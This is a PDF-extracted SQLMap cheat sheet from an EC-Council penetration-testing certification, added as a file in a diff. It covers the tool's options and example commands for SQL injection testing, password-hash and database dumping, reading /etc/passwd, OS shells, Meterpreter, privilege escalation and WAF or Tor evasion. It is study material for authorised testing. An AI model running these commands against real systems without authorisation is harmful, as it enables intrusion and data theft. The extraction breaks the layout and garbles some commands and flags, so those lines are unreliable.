@@ -1,0 +1,531 @@
+Certified Penetration Testing Professional Exam 412-80
+SQLMap Cheat Sheet
+Certified Penetration Testing Professional
+SQLMap Cheat Sheet
+SQLMap
+Source: http://sqlmap.org, https://github.com
+SQLMap is an open-source penetration testing tool for detecting and exploiting SQL injection
+flaws and taking over of database servers. It includes many features such as database
+fingerprinting, over data fetching from the database, accessing the underlying file system and
+executing commands on the operating system via out-of-band connections
+SQLMap Options
+Syntax
+python sqlmap.py [options]
+Options
+-u URL
+or Target URL
+--url=URL
+-g GOOGLEDORK Process Google dork results as target URLs
+--data=DATA Send data string through POST
+--cookie=COOKIE HTTP cookie header value
+Use randomly selected HTTP User-Agent header
+--random-agent
+value
+--proxy=PROXY Use a proxy to connect to the target URL
+--tor Use Tor anonymity network
+--check-tor Verify if Tor is used properly
+Page | 1 Certified Penetration Testing Professional Copyright © by EC-Council
+All Rights Reserved. Reproduction is Strictly Prohibited.
+Certified Penetration Testing Professional Exam 412-80
+SQLMap Cheat Sheet
+Specify the level of tests to perform (1-5,
+--level=LEVEL
+default 1)
+Specify the risk of tests to perform (1-3, default
+--risk=RISK
+1)
+Specify SQL injection techniques to use (default
+--technique=TECH
+"BEUSTQ")
+-a
+or Retrieve everything
+--all
+-b
+or Retrieve DBMS banner
+--banner
+--current-user Retrieve DBMS current user
+--current-db Retrieve DBMS current database
+--passwords Enumerate DBMS user’s password hashes
+--tables Enumerate DBMS database tables
+--columns Enumerate DBMS database table columns
+--schema Enumerate DBMS schema
+--dump Dump DBMS database table entries
+--dump-all Dump all DBMS databases tables entries
+-D DB DBMS database to enumerate
+-T TBL DBMS database table(s) to enumerate
+-C COL DBMS database table column(s) to enumerate
+--os-shell Prompt for an interactive operating system shell
+--os-pwn Prompt for an OOB shell, Meterpreter or VNC
+Do not ask for user input, use the default
+--batch
+behavior
+--flush-session Flush session files for the current target
+--sqlmap-shell Prompt for an interactive sqlmap shell
+--wizard Simple wizard interface for beginner users
+Specify connection string for direct database
+-d DIRECT
+connection
+Page | 2 Certified Penetration Testing Professional Copyright © by EC-Council
+All Rights Reserved. Reproduction is Strictly Prohibited.
+Certified Penetration Testing Professional Exam 412-80
+SQLMap Cheat Sheet
+Parse target(s) from Burp or WebScarab proxy
+-l LOGFILE
+log file
+-m BULKFILE Scan multiple targets given in a textual file
+-r REQUESTFILE Load HTTP request from a file
+-c CONFIGFILE Load options from a configuration INI file
+--method=METHOD Force usage of the given HTTP method
+Specify character used for splitting parameter
+--param-del=PARA..
+values
+Specify character used for splitting cookie
+--cookie-del=COO..
+values
+Specify a file containing cookies in
+--load-cookies=L..
+Netscape/wget format
+--drop-set-cookie Ignore Set-Cookie header from the response
+--user-agent:AGENT Specify HTTP User-Agent header value
+--host=HOST Specify HTTP Host header value
+--referer=REFERER Specify HTTP Referer header value
+-H HEADER
+or Specify Extra header
+--hea..
+--headers=HEADERS Specify Extra headers
+--auth-type=AUTH.. Specify HTTP authentication type
+--auth-cred=AUTH.. Specify HTTP authentication credentials
+Specify HTTP authentication PEM cert/private
+--auth-file=AUTH..
+key file
+--ignore-code=IG.. Ignore (problematic) HTTP error code (e.g. 401)
+--ignore-proxy Ignore system default proxy settings
+--ignore-redirects Ignore redirection attempts
+--ignore-timeouts Ignore connection timeouts
+--proxy=PROXY Use a proxy to connect to the target URL
+--proxy-cred=PRO.. Specify proxy authentication credentials
+--proxy-file=PRO.. Load proxy list from a file
+--tor-port=TORPORT Set Tor proxy port other than the default
+Page | 3 Certified Penetration Testing Professional Copyright © by EC-Council
+All Rights Reserved. Reproduction is Strictly Prohibited.
+Certified Penetration Testing Professional Exam 412-80
+SQLMap Cheat Sheet
+--tor-type=TORTYPE Set Tor proxy type
+--delay=DELAY Delay in seconds between each HTTP request
+--timeout=TIMEOUT Seconds to wait before timeout connection
+--retries=RETRIES Retries when the connection timeouts
+Randomly change the value for a given
+--randomize=RPARAM
+parameter(s)
+The URL address to visit frequently during
+--safe-url=SAFEURL
+testing
+--safe-post=SAFE.. POST data to send to a safe URL
+--safe-req=SAFER.. Load safe HTTP request from a file
+Specify test requests between two visits to a
+--safe-freq=SAFE..
+given safe URL
+--skip-urlencode Skip URL encoding of payload data
+Specify parameter used to hold the anti-CSRF
+--csrf-token=CSR..
+token
+Specify URL address to visit for extraction of
+--csrf-url=CSRFURL
+anti-CSRF token
+--force-ssl Force usage of SSL/HTTPS
+--hpp Use HTTP parameter pollution method
+Evaluate provided Python code before the
+--eval=EVALCODE
+request
+-o Turn on all optimization switches
+--predict-output Predict common queries output
+--keep-alive Use persistent HTTP(s) connections
+Retrieve page length without the actual HTTP
+--null-connection
+response body
+Specify max number of concurrent HTTP(s)
+--threads=THREADS
+requests (default 1)
+-p TESTPARAMETER Specify testable parameter(s)
+--skip=SKIP Skip testing for a given parameter(s)
+Skip testing parameters that do not appear to
+--skip-static
+be dynamic
+Page | 4 Certified Penetration Testing Professional Copyright © by EC-Council
+All Rights Reserved. Reproduction is Strictly Prohibited.
+Certified Penetration Testing Professional Exam 412-80
+SQLMap Cheat Sheet
+Specify regexp to exclude parameters from
+--param-exclude=..
+testing
+--dbms=DBMS Force back-end DBMS to the provided value
+--dbms-cred=DBMS.. Specify DBMS authentication credentials
+Force back-end DBMS operating system to the
+--os=OS
+provided value
+--invalid-bignum Use big numbers for invalidating values
+--invalid-logical Use logical operations for invalidating values
+--invalid-string Use random strings for invalidating values
+--no-cast Turn off payload casting mechanism
+--no-escape Turn off string escaping mechanism
+--prefix=PREFIX Injection payload prefix string
+--suffix=SUFFIX Injection payload suffix string
+--tamper=TAMPER Use given script(s) for tampering injection data
+Specify the string to match when the query is
+--string=STRING
+evaluated to True
+Specify the string to match when the query is
+--not-string=NOT..
+evaluated to False
+Specify regexp to match when the query is
+--regexp=REGEXP
+evaluated to True
+Specify HTTP code to match when the query is
+--code=CODE
+evaluated to True
+Compare pages based only on the textual
+--text-only
+content
+--titles Compare pages based only on their titles
+--time-sec=TIMESEC Specify seconds to delay the DBMS response
+Specify a range of columns to test for UNION
+--union-cols=UCOLS
+query SQL injection
+Specify character to use for brute-forcing
+--union-char=UCHAR
+number of columns
+Specify table to use in FROM part of UNION
+--union-from=UFROM
+query SQL injection
+Page | 5 Certified Penetration Testing Professional Copyright © by EC-Council
+All Rights Reserved. Reproduction is Strictly Prohibited.
+Certified Penetration Testing Professional Exam 412-80
+SQLMap Cheat Sheet
+Specify domain name used for DNS exfiltration
+--dns-domain=DNS..
+attack
+Resulting page URL searched for a second-order
+--second-url=SEC..
+response
+--second-req=SEC.. Load second-order HTTP request from the file
+-f
+or Perform an extensive DBMS version fingerprint
+--fingerprint
+--hostname Retrieve DBMS server hostname
+--is-dba Detect if the DBMS current user is DBA
+--users Enumerate DBMS users
+--privileges Enumerate DBMS users’ privileges
+--roles Enumerate DBMS users’ roles
+--dbs Enumerate DBMS databases
+--count Retrieve the number of entries for the table(s)
+Search column(s), table(s) and/or database
+--search
+name(s)
+--comments Check for DBMS comments during enumeration
+-X EXCLUDE DBMS database identifier(s) to not enumerate
+-U USER DBMS user to enumerate
+Exclude DBMS system databases when
+--exclude-sysdbs
+enumerating tables
+--pivot-column=P.. Pivot column name
+--where=DUMPWHERE Use WHERE condition while table dumping
+--start=LIMITSTART First dump table entry to retrieve
+--stop=LIMITSTOP Last dump table entry to retrieve
+--first=FIRSTCHAR First query output word character to retrieve
+--last=LASTCHAR Last query output word character to retrieve
+--sql-query=QUERY Specify SQL statement to be executed
+--sql-shell Prompt for an interactive SQL shell
+--sql-file=SQLFILE Execute SQL statements from a given file(s)
+--common-tables Verify the existence of common tables
+Page | 6 Certified Penetration Testing Professional Copyright © by EC-Council
+All Rights Reserved. Reproduction is Strictly Prohibited.
+Certified Penetration Testing Professional Exam 412-80
+SQLMap Cheat Sheet
+--common-columns Verify the existence of common columns
+--udf-inject Inject custom user-defined functions
+--shared-lib=SHLIB Local path of the shared library
+--file-read=FILE.. Read a file from the back-end DBMS file system
+Write a local file on the back-end DBMS file
+--file-write=FIL..
+system
+--file-dest=FILE.. Back-end DBMS absolute file path to write to
+--os-cmd=OSCMD Execute an operating system command
+One-click prompts for an OOB shell,
+--os-smbrelay
+Meterpreter or VNC
+--os-bof Stored procedure buffer overflow exploitation
+--priv-esc Database process user privilege escalation
+The local path where Metasploit Framework is
+--msf-path=MSFPATH
+installed
+The remote absolute path of temporary files
+--tmp-path=TMPPATH
+directory
+--reg-read Read a Windows registry key value
+--reg-add Write a Windows registry key value data
+--reg-del Delete a Windows registry key value
+--reg-key=REGKEY Windows registry key
+--reg-value=REGVAL Windows registry key value
+--reg-data=REGDATA Windows registry key value data
+--reg-type=REGTYPE Windows registry key value type
+-s SESSIONFILE Load session from a stored (.sqlite) file
+-t TRAFFICFILE Log all HTTP traffic into a textual file
+--binary-fields=.. Specify result fields having binary values
+Verify Internet connection before assessing the
+--check-internet
+target
+--crawl=CRAWLDEPTH Crawl the website starting from the target URL
+--crawl-exclude=.. Specify regexp to exclude pages from crawling
+--csv-del=CSVDEL Specify delimiting character used in CSV output
+--charset=CHARSET Specify blind SQL injection charset
+Page | 7 Certified Penetration Testing Professional Copyright © by EC-Council
+All Rights Reserved. Reproduction is Strictly Prohibited.
+Certified Penetration Testing Professional Exam 412-80
+SQLMap Cheat Sheet
+--dump-format=DU.. Specify format of dumped data
+Specify character encoding used for data
+--encoding=ENCOD..
+retrieval
+Display for each output the estimated time of
+--eta
+arrival
+--forms Parse and test forms on target URL
+--fresh-queries Ignore query results stored in the session file
+--har=HARFILE Log all HTTP traffic into a HAR file
+--hex Use hex conversion during data retrieval
+--output-dir=OUT.. The custom output directory path
+Parse and display DBMS error messages from
+--parse-errors
+responses
+Use given script(s) for preprocessing of
+--preprocess=PRE..
+response data
+Redump entries having an unknown character
+--repair
+marker
+--save=SAVECONFIG Save options to a configuration INI file
+Specify regexp to filter targets from provided
+--scope=SCOPE
+proxy log
+--test-filter=TE.. Skip tests by payloads and/or titles
+--update Update sqlmap
+-z MNEMONICS Use short mnemonics
+Run host OS command(s) when SQL injection is
+--alert=ALERT
+found
+--answers=ANSWERS Set predefined answers
+Beep on the question and/or when SQL
+--beep
+injection is found
+Clean up the DBMS from sqlmap specific UDF
+--cleanup
+and tables
+Check for missing (optional) sqlmap
+--dependencies
+dependencies
+--disable-coloring Disable console output coloring
+Page | 8 Certified Penetration Testing Professional Copyright © by EC-Council
+All Rights Reserved. Reproduction is Strictly Prohibited.
+Certified Penetration Testing Professional Exam 412-80
+SQLMap Cheat Sheet
+Use Google dork results from the specified page
+--gpage=GOOGLEPAGE
+number
+--identify-waf Make thorough testing for a WAF/IPS protection
+--list-tampers Display list of available tamper scripts
+Imitate smartphone through HTTP User-Agent
+--mobile
+header
+--offline Work in offline mode
+Safely remove all content from sqlmap data
+--purge
+directory
+--skip-waf Skip heuristic detection of WAF/IPS protection
+Conduct thorough tests only if positive
+--smart
+heuristic(s)
+--sqlmap-shell Prompt for an interactive sqlmap shell
+--tmp-dir=TMPDIR Local directory for storing temporary files
+--web-root=WEBROOT Web server document root directory
+--wizard Simple wizard interface for beginner users
+SQLMap Commands
+Command Description
+sqlmap -u <Target URL> -p id Scans GET Request
+sqlmap -u <Target URL>–
+data=”user=admin&password=admin Scans POST Request
+” -p user
+sqlmap -u <Target URL> –
+Scans POST Login Pages
+cookie=”cookie value”
+sqlmap -u <Target URL> –crawl=1 Defines a depth to crawl
+sqlmap -u <Target URL> -p id –
+SQLMap Through Proxy
+proxy=”http://localhost:8080″
+sqlmap -u <Target URL> --crawl3 The batch command to use the default value to
+--batch proceed without asking the user
+Form command to parse the page and guide the
+sqlmap -u <Target URL> --forms
+user to test the identified fields
+Page | 9 Certified Penetration Testing Professional Copyright © by EC-Council
+All Rights Reserved. Reproduction is Strictly Prohibited.
+Certified Penetration Testing Professional Exam 412-80
+SQLMap Cheat Sheet
+Threads command to define the number of
+sqlmap -u <Target URL> --dbs –
+concurrent requests to be sent by the SQLMap
+threads=5
+tool
+Verbose to see the payload being sent by the
+sqlmap -u <Target URL> -v 3
+tool
+sqlmap -u <Target URL> --dbs Database Enumeration
+python sqlmap -u <Target URL> -
+-
+To Bypass WAF
+tamper=apostrophemask,apostroph
+enullencode
+sqlmap -u <Target URL> –os-
+Run system commands for Linux server
+shell
+sqlmap -u <Target URL> –os-cmd
+Run system commands for windows server
+<cmd>
+sqlmap -u <Target URL> –sql-
+Run SQL queries
+shell
+sqlmap -u <Target URL> –auth-
+Scans a page protected by HTTP authentication
+type Basic –auth-cred
+like Basic, NTLM, and Digest
+“admin:admin”
+sqlmap -u <Target URL> —auth-
+Scans a page protected by a key-based
+file=<path to PEM certificate
+authentication
+or private key file>
+sqlmap -u <Target URL> –tor To use the default Tor anonymity network
+sqlmap -u <Target URL> –tor-
+To define a Tor port
+port=<tor proxy port>
+sqlmap -u <Target URL> –delay=1 If a delay is required between each HTTP
+#1 second delay request
+sqlmap -u <Target URL> –csrf-
+Including CSRF token in the command
+token=<csrf token>
+sqlmap -r
+/root/Desktop/Burp.txt –second- Second-Order SQL injection
+order “<Target URL>”
+python sqlmap.py -u <Target
+Analyzing that the current user is dba
+URL> –is-dba -v 1
+python sqlmap.py -u <Target
+User list database management system
+URL> –users -v 0
+python sqlmap.py -u <Target
+URL> –passwords -v 0
+or Database user password
+python sqlmap.py -u <Target
+URL> –passwords -U sa -v 0
+Page | 10 Certified Penetration Testing Professional Copyright © by EC-Council
+All Rights Reserved. Reproduction is Strictly Prohibited.
+Certified Penetration Testing Professional Exam 412-80
+SQLMap Cheat Sheet
+python sqlmap.py -u <Target
+URL> –privileges -v 0
+or
+To view the user permissions
+python sqlmap.py -u <Target
+URL> –privileges -U postgres -v
+0
+python sqlmap.py -u <Target
+dbs can use the database
+URL> –dbs -v 0
+python sqlmap.py -u <Target
+URL> –tables -D Tables column in a table
+“information_scheam”
+python sqlmap.py -u <Target
+URL> –columns -T “user” -D Columns are listed in the table column names
+“mysql” -v 1
+python sqlmap.py -u <Target
+Dump the contents of the column specified in
+URL> –dump -T “users” -D
+the list
+“testdb”
+python sqlmap.py -u <Target
+dumap-all List all databases, all tables content
+URL> –dump-all -v 0
+python sqlmap.py -u <Target File to read the content of the document
+URL> –file / etc / password [load_file () function]
+python sqlmap.py -u <Target
+Execute SQL
+URL> –sql-shell
+python sqlmap.py -u <Target
+URL> –method POST –data “id = POST submission
+1”
+python sqlmap.py -u <Target
+COOKIE Submit
+URL> –cookie “id = 1” -v 1
+python sqlmap.py -u <Target
+Refer to deceive
+URL> –refer “url” -v 3
+python sqlmap.py -u <Target
+URL> –user-agent “Mozilla / 4.0
+(compatible; MSIE 7.0; Windows
+NT 5.1)” -v 3
+Using a custom user-agent or user-agents.txt
+or
+python sqlmap.py -u <Target
+URL> -v 1 -a “./txt/user-
+agents.txt”
+python sqlmap.py -u <Target
+URL> -v 1 –current-user – Use of multithreading guess solution
+threads 3
+Page | 11 Certified Penetration Testing Professional Copyright © by EC-Council
+All Rights Reserved. Reproduction is Strictly Prohibited.
+Certified Penetration Testing Professional Exam 412-80
+SQLMap Cheat Sheet
+python sqlmap.py -u <Target Specify the database, bypassing the automatic
+URL> -v 2 –dbms “PostgreSQL” detection SQLMAP
+python sqlmap.py -u <Target Specifies the operating system automatically
+URL> -v 2 –os “Windows” detects the bypass SQLMAP
+python sqlmap.py -u <Target
+URL> -v 3 -p “id” –prefix ” ‘” Prefix and –postfix custom payload
+–postfix “and’ test ‘=’ test”
+python sqlmap.py -u <Target
+Union injection test
+URL> –union-test -v -1
+python sqlmap.py -u <Target
+URL> –union-test –union-tech With the order by
+orderby -v 1
+python sqlmap –u "<Target URL>"
+Parsing directly into SQLMap
+--cookies= --data=
+python sqlmap -u "<Target URL>"
+Increase the Risk and Level value
+--risk=3 --level=5
+Exploits the target to gain a full system shell
+sqlmap -u <Target URL> --os-pwn
+(Metasploit integration)
+sqlmap -u <Target URL> --os-
+Exploits the target to gain SMB relay connection
+smbrelay
+Exploits the target using a buffer overflow
+sqlmap -u <Target URL> --os-bof
+attack
+sqlmap -u <Target URL> --udf- Injects user-defined functions into the target
+inject database
+sqlmap -u <Target URL> --proxy-
+Loads a list of proxies from a file
+file=<file>
+sqlmap -u <Target URL> --force- Forces SQLMap to use SSL/TLS for all HTTP
+ssl requests
+sqlmap -u <Target URL> --msf- Specifies the path to the Metasploit Framework
+path=<path> for integration
+sqlmap -u <Target URL> --
+Uses a second URL for second-order injections
+second-url=<URL>
+sqlmap -u <Target URL> --safe-
+Sets the frequency for running safe checks
+freq=<number>
+Page | 12 Certified Penetration Testing Professional Copyright © by EC-Council
+All Rights Reserved. Reproduction is Strictly Prohibited.
